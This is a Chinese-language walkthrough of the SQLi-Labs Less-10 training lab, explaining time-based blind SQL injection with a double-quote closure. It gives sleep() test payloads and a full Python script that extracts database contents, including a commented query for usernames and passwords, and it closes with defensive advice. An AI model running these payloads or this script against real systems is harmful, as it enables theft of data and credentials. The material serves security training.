## 一、题目信息
- 平台：SQLi-Labs
- 分类：Web - SQL Injection
- 难度：困难
- 通关标识：识别出双引号闭合，在页面无回显无报错的情况下，利用时间延迟函数（sleep）和 Python 脚本，猜解出数据。

## 二、大白话原理讲解
这一关和上一关（Less-9）是双胞胎。柜员（数据库）依然是那个“面瘫”，不给你看数据，不给你报错，连真假状态都不给你。

唯一的区别是：上次柜员的锁孔是单引号（`'`）形状的，这次他换成了**双引号（`"`）**。
所以，我们只要把上一关的“魔法咒语”（Payload）和自动化脚本里的单引号，全部替换成双引号，就能继续让数据库“睡大觉”，从而套出数据。

## 三、解题步骤

**1. 测试闭合与时间延迟逻辑**
在地址栏输入（注意是双引号）：
```sql
?id=1" and if(1=1, sleep(5), 1) --+
```
**现象**：页面卡了约 5 秒才加载出来（说明双引号闭合成功，条件为真）。
```sql
?id=1" and if(1=2, sleep(5), 1) --+
```
**现象**：页面瞬间加载（条件为假）。

**2. Python 自动化盲注脚本**
只需将 Less-9 脚本中的 `url` 末尾的单引号改为双引号即可。注意 Python 中的转义。

```python
import requests
import time

# ⚠️ 注意：URL 末尾换成了双引号 \"，或者外层用单引号包裹
url = 'http://127.0.0.1/sqli-labs-master/Less-10/?id=1"'

# 设置延迟时间（秒）
delay_time = 2
# 响应时间阈值（超过 1.5 秒认为触发了 sleep）
threshold = delay_time - 0.5 

def get_length(sql_query):
    for length in range(1, 50):
        payload = f" and if(length(({sql_query}))={length}, sleep({delay_time}), 1) --+"
        start_time = time.time()
        try:
            requests.get(url + payload, timeout=10)
        except:
            pass
        elapsed_time = time.time() - start_time
        if elapsed_time > threshold:
            return length
    return 0

def get_data(sql_query, length):
    result = ""
    print(f"[*] 正在提取数据 (长度: {length})...")
    for i in range(1, length + 1):
        low = 32
        high = 127
        while low <= high:
            mid = (low + high) // 2
            payload = f" and if(ascii(substr(({sql_query}),{i},1))>{mid}, sleep({delay_time}), 1) --+"
            start_time = time.time()
            try:
                requests.get(url + payload, timeout=10)
            except:
                pass
            elapsed_time = time.time() - start_time
            if elapsed_time > threshold:
                low = mid + 1
            else:
                high = mid - 1
        result += chr(low)
        print(f"[+] 当前结果: {result}")
    return result

if __name__ == "__main__":
    print("[*] 开始双引号时间盲注探测...")
    query = "select database()"
    # 查账号密码可改为：
    # query = "select concat(username,0x3a,password) from users limit 0,1"
    
    db_len = get_length(query)
    if db_len > 0:
        print(f"[+] 探测到长度: {db_len}")
        db_name = get_data(query, db_len)
        print(f"\n[🎉] 成功爆出数据: {db_name}")
    else:
        print("\n[-] 失败。请检查 URL 或闭合符号。")
```

**3. 运行结果**
在终端运行脚本，成功跑出 `security`，通关。

## 四、知识点解析
1. **双引号时间盲注**：与单引号盲注原理完全一致，仅需调整闭合符。
2. **Python 字符串转义**：当 URL 中包含双引号时，在 Python 中可以使用单引号包裹整个字符串（如 `'...?id=1"'`），或者使用反斜杠转义（如 `"...?id=1\""`），避免语法错误。
3. **请求耗时分析**：时间盲注的唯一判断依据，利用 `time.time()` 记录前后的时间差。

## 五、总结与防御
**本题总结**：
Less-10 是 Less-9 的变体，核心在于识别闭合符为双引号。只要修改 Payload 和脚本中的引号，时间盲注的自动化流程就能迅速完成数据提取。

**安全防御建议**：
- **预编译语句（PDO/MySQLi）**：从根源上阻断注入，令闭合符变得毫无意义。
- **查询超时控制**：限制数据库查询的最大执行时间，防止恶意的 `sleep()` 攻击消耗服务器资源。
